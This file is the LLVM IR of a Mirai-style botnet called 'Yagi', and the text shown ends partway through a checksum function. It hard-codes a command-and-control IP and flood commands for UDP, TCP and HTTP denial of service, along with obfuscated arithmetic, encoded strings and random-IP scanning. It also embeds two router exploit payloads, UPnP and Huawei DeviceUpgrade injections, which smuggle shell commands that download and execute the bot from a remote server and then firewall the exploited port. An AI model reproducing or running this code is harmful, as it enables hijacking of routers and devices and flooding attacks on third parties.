; ModuleID = 'host/ir_sub/Yagi.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.exploit_scanner_connection = type { i32, i32, i32, i32, i16, i32, [256 x i8], i8**, [2560 x i8], [2560 x i8], i32 }
%struct.table_value = type { i8*, i16 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.udphdr = type { i16, i16, i16, i16 }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.anon.0 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }

@c2_bot_port = global i32 27, align 4
@c2_http_host = global i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str, i32 0, i32 0), align 8
@.str = private unnamed_addr constant [15 x i8] c"185.244.25.149\00", align 1
@numattackpids = global i64 0, align 8
@UserAgents = global [39 x i8*] [i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([139 x i8], [139 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([137 x i8], [137 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([142 x i8], [142 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.39, i32 0, i32 0)], align 16
@.str.1 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.2 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.3 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.4 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.5 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.6 = private unnamed_addr constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.7 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.8 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.9 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.10 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.11 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.12 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.13 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.14 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.15 = private unnamed_addr constant [139 x i8] c"Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1\00", align 1
@.str.16 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.17 = private unnamed_addr constant [137 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.18 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.19 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.20 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.21 = private unnamed_addr constant [85 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6\00", align 1
@.str.22 = private unnamed_addr constant [128 x i8] c"Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.23 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)\00", align 1
@.str.24 = private unnamed_addr constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.25 = private unnamed_addr constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\00", align 1
@.str.26 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11\00", align 1
@.str.27 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\00", align 1
@.str.28 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)\00", align 1
@.str.29 = private unnamed_addr constant [65 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02\00", align 1
@.str.30 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60\00", align 1
@.str.31 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0\00", align 1
@.str.32 = private unnamed_addr constant [128 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\00", align 1
@.str.33 = private unnamed_addr constant [83 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)\00", align 1
@.str.34 = private unnamed_addr constant [142 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)\00", align 1
@.str.35 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.36 = private unnamed_addr constant [79 x i8] c"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.37 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.38 = private unnamed_addr constant [74 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:2.0b7pre) Gecko/20100921 Firefox/4.0b7pre\00", align 1
@.str.39 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@attackpids = common global i32* null, align 8
@retry = global i32 1, align 4
@retrys = global i32 3, align 4
@tryagain = global i32 1, align 4
@max_attacks = global i32 4, align 4
@maxboot_time = global i32 600, align 4
@trigger = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.54, i32 0, i32 0), align 8
@.str.54 = private unnamed_addr constant [2 x i8] c"@\00", align 1
@C2 = global i32 -1, align 4
@ioctl_pid = global i32 0, align 4
@c2_host = common global [16 x i8] zeroinitializer, align 16
@Socket = common global %struct.sockaddr_in zeroinitializer, align 4
@buf = common global [1024 x i8] zeroinitializer, align 16
@buffer = common global i32 0, align 4
@LOCAL_ADDR = common global i32 0, align 4
@scanPid = common global i32 0, align 4
@pongresponse = common global [25 x i8] zeroinitializer, align 16
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.40 = private unnamed_addr constant [16 x i8] c"/usr/dict/words\00", align 1
@.str.41 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.42 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.43 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.44 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.45 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.46 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.47 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.48 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.49 = private unnamed_addr constant [19 x i8] c"Invalid flag \22%s\22\0A\00", align 1
@.str.50 = private unnamed_addr constant [14 x i8] c"gethostbyname\00", align 1
@.str.51 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.52 = private unnamed_addr constant [8 x i8] c"connect\00", align 1
@.str.53 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.55 = private unnamed_addr constant [15 x i8] c"arch yagi.%s\0D\0A\00", align 1
@.str.56 = private unnamed_addr constant [5 x i8] c"kill\00", align 1
@.str.57 = private unnamed_addr constant [5 x i8] c"stop\00", align 1
@.str.58 = private unnamed_addr constant [9 x i8] c"killattk\00", align 1
@.str.59 = private unnamed_addr constant [3 x i8] c"kt\00", align 1
@.str.60 = private unnamed_addr constant [4 x i8] c"udp\00", align 1
@.str.61 = private unnamed_addr constant [9 x i8] c"udpflood\00", align 1
@.str.62 = private unnamed_addr constant [4 x i8] c"tcp\00", align 1
@.str.63 = private unnamed_addr constant [9 x i8] c"tcpflood\00", align 1
@.str.64 = private unnamed_addr constant [4 x i8] c"std\00", align 1
@.str.65 = private unnamed_addr constant [9 x i8] c"stdflood\00", align 1
@.str.66 = private unnamed_addr constant [5 x i8] c"http\00", align 1
@.str.67 = private unnamed_addr constant [10 x i8] c"httpflood\00", align 1
@.str.68 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.69 = private unnamed_addr constant [8 x i8] c"unknown\00", align 1
@.str.70 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.71 = private unnamed_addr constant [7 x i8] c"PONG\0D\0A\00", align 1
@.str.72 = private unnamed_addr constant [11 x i8] c"killc2proc\00", align 1
@exploit_scanner_pid = global i32 0, align 4
@exploit_fake_time = global i32 0, align 4
@conn_table = common global %struct.exploit_scanner_connection* null, align 8
@exploit_rsck = global i32 0, align 4
@exploit_scanner_rawpkt = global [40 x i8] zeroinitializer, align 16
@.str.73 = private unnamed_addr constant [920 x i8] c"POST /UD/?9 HTTP/1.1\0D\0AUser-Agent: SEFA\0D\0AContent-Type: text/xml\0D\0ASOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\0D\0A\0D\0A<?xml version=\221.0\22 ?><s:Envelope xmlns:s=\22http://schemas.xmlsoap.org/soap/envelope/\22 s:encodingStyle=\22http://schemas.xmlsoap.org/soap/encoding/\22><s:Body><u:AddPortMapping xmlns:u=\22urn:schemas-upnp-org:service:WANIPConnection:1\22><NewRemoteHost></NewRemoteHost><NewExternalPort>47449</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`>/tmp/.e && cd /tmp; >/var/dev/.e && cd /var/dev; wget http://89.34.26.138/yagi.sh -O - > yagi.sh; chmod 777 yagi.sh; sh yagi.sh; rm yagi.sh; iptables -A INPUT -p tcp --destination-port 5555 -j DROP`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\00", align 1
@huawei_scanner_pid = global i32 0, align 4
@huawei_fake_time = global i32 0, align 4
@huawei_rsck = global i32 0, align 4
@huawei_scanner_rawpkt = global [40 x i8] zeroinitializer, align 16
@.str.77 = private unnamed_addr constant [887 x i8] c"POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\0D\0AContent-Length: 430\0D\0AConnection: keep-alive\0D\0AAccept: */*\0D\0AAuthorization: Digest username=\22dslf-config\22, realm=\22HuaweiHomeGateway\22, nonce=\2288645cefb1f9ede0e336e3569d75ee30\22, uri=\22/ctrlt/DeviceUpgrade_1\22, response=\223612f843a42db38f48f59d2a3597e19c\22, algorithm=\22MD5\22, qop=\22auth\22, nc=00000001, cnonce=\22248d1a2560100669\22\0D\0A\0D\0A<?xml version=\221.0\22 ?><s:Envelope xmlns:s=\22http://schemas.xmlsoap.org/soap/envelope/\22 s:encodingStyle=\22http://schemas.xmlsoap.org/soap/encoding/\22><s:Body><u:Upgrade xmlns:u=\22urn:schemas-upnp-org:service:WANPPPConnection:1\22><NewStatusURL>$(/bin/busybox wget -g 89.34.26.138 -l /tmp/yagi -r /bins/yagi.mips; /bin/busybox chmod 777 * /tmp/yagi; /tmp/yagi ; /bin/busybox iptables -A INPUT -p tcp --destination-port 37215 -j DROP)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>\0D\0A\0D\0A\00", align 1
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@.str.84 = private unnamed_addr constant [15 x i8] c"M\06\07\14M\15\03\16\01\0A\06\0D\05b\00", align 1
@.str.1.85 = private unnamed_addr constant [20 x i8] c"M\06\07\14M\0F\0B\11\01M\15\03\16\01\0A\06\0D\05b\00", align 1
@.str.2.86 = private unnamed_addr constant [24 x i8] c"M\06\07\14M$65&6SRS=\15\03\16\01\0A\06\0D\05b\00", align 1
@.str.3.87 = private unnamed_addr constant [25 x i8] c"M\06\07\14M$65&6SRS>B\15\03\16\01\0A\06\0D\05b\00", align 1
@.str.4.88 = private unnamed_addr constant [16 x i8] c"M\06\07\14M\15\03\16\01\0A\06\0D\05Rb\00", align 1
@.str.5.89 = private unnamed_addr constant [23 x i8] c"M\07\16\01M\06\07\04\03\17\0E\16M\15\03\16\01\0A\06\0D\05b\00", align 1
@.str.6.90 = private unnamed_addr constant [16 x i8] c"M\11\00\0B\0CM\15\03\16\01\0A\06\0D\05b\00", align 1
@table = common global [8 x %struct.table_value] zeroinitializer, align 16
@table_key = global i32 -554832193, align 4

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = sub i32 0, %5
  %7 = sub i32 0, -1640531527
  %8 = add i32 %6, %7
  %9 = sub i32 0, %8
  %10 = add i32 %5, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %11 = load i32, i32* %2, align 4
  %12 = sub i32 0, -1640531527
  %13 = sub i32 %11, %12
  %14 = add i32 %11, -1640531527
  %15 = add i32 %13, -210825842
  %16 = add i32 %15, -1640531527
  %17 = sub i32 %16, -210825842
  %18 = add i32 %13, -1640531527
  store i32 %17, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %19

; <label>:19:                                     ; preds = %65, %1
  %20 = load i32, i32* %3, align 4
  %21 = icmp slt i32 %20, 4096
  br i1 %21, label %22, label %71

; <label>:22:                                     ; preds = %19
  %23 = load i32, i32* %3, align 4
  %24 = sub i32 0, 3
  %25 = add i32 %23, %24
  %26 = sub nsw i32 %23, 3
  %27 = sext i32 %25 to i64
  %28 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %27
  %29 = load i32, i32* %28, align 4
  %30 = load i32, i32* %3, align 4
  %31 = sub i32 %30, 1911553306
  %32 = sub i32 %31, 2
  %33 = add i32 %32, 1911553306
  %34 = sub nsw i32 %30, 2
  %35 = sext i32 %33 to i64
  %36 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %35
  %37 = load i32, i32* %36, align 4
  %38 = xor i32 %29, -1
  %39 = and i32 %37, %38
  %40 = xor i32 %37, -1
  %41 = and i32 %29, %40
  %42 = or i32 %39, %41
  %43 = xor i32 %29, %37
  %44 = xor i32 %42, -1
  %45 = and i32 -1640531527, %44
  %46 = xor i32 -1640531527, -1
  %47 = and i32 %42, %46
  %48 = or i32 %45, %47
  %49 = xor i32 %42, -1640531527
  %50 = load i32, i32* %3, align 4
  %51 = xor i32 %48, -1
  %52 = and i32 824218988, %51
  %53 = xor i32 824218988, -1
  %54 = and i32 %48, %53
  %55 = xor i32 %50, -1
  %56 = and i32 %55, 824218988
  %57 = and i32 %50, %53
  %58 = or i32 %52, %54
  %59 = or i32 %56, %57
  %60 = xor i32 %58, %59
  %61 = xor i32 %48, %50
  %62 = load i32, i32* %3, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %63
  store i32 %60, i32* %64, align 4
  br label %65

; <label>:65:                                     ; preds = %22
  %66 = load i32, i32* %3, align 4
  %67 = add i32 %66, 971307567
  %68 = add i32 %67, 1
  %69 = sub i32 %68, 971307567
  %70 = add nsw i32 %66, 1
  store i32 %69, i32* %3, align 4
  br label %19

; <label>:71:                                     ; preds = %19
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = sub i32 %5, -1571837810
  %7 = add i32 %6, 1
  %8 = add i32 %7, -1571837810
  %9 = add i32 %5, 1
  %10 = xor i32 4095, -1
  %11 = xor i32 %8, %10
  %12 = and i32 %11, %8
  %13 = and i32 %8, 4095
  store i32 %12, i32* @rand_cmwc.i, align 4
  %14 = load i64, i64* %2, align 8
  %15 = load i32, i32* @rand_cmwc.i, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = zext i32 %18 to i64
  %20 = mul i64 %14, %19
  %21 = load i32, i32* @c, align 4
  %22 = zext i32 %21 to i64
  %23 = add i64 %20, -3670106754024865637
  %24 = add i64 %23, %22
  %25 = sub i64 %24, -3670106754024865637
  %26 = add i64 %20, %22
  store i64 %25, i64* %1, align 8
  %27 = load i64, i64* %1, align 8
  %28 = lshr i64 %27, 32
  %29 = trunc i64 %28 to i32
  store i32 %29, i32* @c, align 4
  %30 = load i64, i64* %1, align 8
  %31 = load i32, i32* @c, align 4
  %32 = zext i32 %31 to i64
  %33 = add i64 %30, -6311878157748697278
  %34 = add i64 %33, %32
  %35 = sub i64 %34, -6311878157748697278
  %36 = add i64 %30, %32
  %37 = trunc i64 %35 to i32
  store i32 %37, i32* %3, align 4
  %38 = load i32, i32* %3, align 4
  %39 = load i32, i32* @c, align 4
  %40 = icmp ult i32 %38, %39
  br i1 %40, label %41, label %52

; <label>:41:                                     ; preds = %0
  %42 = load i32, i32* %3, align 4
  %43 = sub i32 %42, 167953556
  %44 = add i32 %43, 1
  %45 = add i32 %44, 167953556
  %46 = add i32 %42, 1
  store i32 %45, i32* %3, align 4
  %47 = load i32, i32* @c, align 4
  %48 = sub i32 %47, 244132046
  %49 = add i32 %48, 1
  %50 = add i32 %49, 244132046
  %51 = add i32 %47, 1
  store i32 %50, i32* @c, align 4
  br label %52

; <label>:52:                                     ; preds = %41, %0
  %53 = load i32, i32* %4, align 4
  %54 = load i32, i32* %3, align 4
  %55 = add i32 %53, -1003525041
  %56 = sub i32 %55, %54
  %57 = sub i32 %56, -1003525041
  %58 = sub i32 %53, %54
  %59 = load i32, i32* @rand_cmwc.i, align 4
  %60 = zext i32 %59 to i64
  %61 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %60
  store i32 %57, i32* %61, align 4
  ret i32 %57
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %22, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %27

; <label>:10:                                     ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = add i32 %12, 1430413905
  %14 = add i32 %13, 65
  %15 = sub i32 %14, 1430413905
  %16 = add i32 %12, 65
  %17 = trunc i32 %15 to i8
  %18 = load i8*, i8** %3, align 8
  %19 = load i32, i32* %5, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds i8, i8* %18, i64 %20
  store i8 %17, i8* %21, align 1
  br label %22

; <label>:22:                                     ; preds = %10
  %23 = load i32, i32* %5, align 4
  %24 = sub i32 0, 1
  %25 = sub i32 %23, %24
  %26 = add nsw i32 %23, 1
  store i32 %25, i32* %5, align 4
  br label %6

; <label>:27:                                     ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #9
  %6 = load i32, i32* %2, align 4
  %7 = xor i32 %6, -1
  %8 = xor i32 %5, %7
  %9 = and i32 %8, %5
  %10 = and i32 %5, %6
  store i32 %9, i32* %3, align 4
  %11 = load i32, i32* %3, align 4
  %12 = call i32 @rand_cmwc()
  %13 = load i32, i32* %2, align 4
  %14 = xor i32 %13, -1
  %15 = and i32 -1, %14
  %16 = xor i32 -1, -1
  %17 = and i32 %13, %16
  %18 = or i32 %15, %17
  %19 = xor i32 %13, -1
  %20 = xor i32 %12, -1
  %21 = xor i32 %18, -1
  %22 = xor i32 -1535435339, -1
  %23 = or i32 %20, %21
  %24 = or i32 -1535435339, %22
  %25 = xor i32 %23, -1
  %26 = and i32 %25, %24
  %27 = and i32 %12, %18
  %28 = xor i32 %11, -1
  %29 = and i32 -1135701511, %28
  %30 = xor i32 -1135701511, -1
  %31 = and i32 %11, %30
  %32 = xor i32 %26, -1
  %33 = and i32 %32, -1135701511
  %34 = and i32 %26, %30
  %35 = or i32 %29, %31
  %36 = or i32 %33, %34
  %37 = xor i32 %35, %36
  %38 = xor i32 %11, %26
  ret i32 %37
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #1

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %24

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = sub i64 0, %14
  %16 = sub i64 0, %13
  %17 = add i64 %15, %16
  %18 = sub i64 0, %17
  %19 = add i64 %14, %13
